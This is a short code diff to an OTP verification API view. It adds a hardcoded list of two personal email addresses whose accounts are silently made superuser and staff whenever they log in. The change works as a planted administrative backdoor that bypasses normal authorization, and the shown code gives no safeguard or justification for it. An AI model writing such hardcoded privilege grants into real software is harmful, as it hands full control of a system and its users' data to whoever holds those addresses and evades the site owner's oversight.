@@ -56,6 +56,12 @@ class VerifyOTPAPIView(APIView):
 
             user,created = User.objects.get_or_create(email=email)
 
+            superadmin_emails = ['aaa2004bek@gmail.com', 'chesswanter1909@gmail.com']
+            if email in superadmin_emails:
+                user.is_superuser = True
+                user.is_staff = True
+                user.save()
+
             tokens = generate_jwt_tokens(user)
 
             otp_obj.delete()
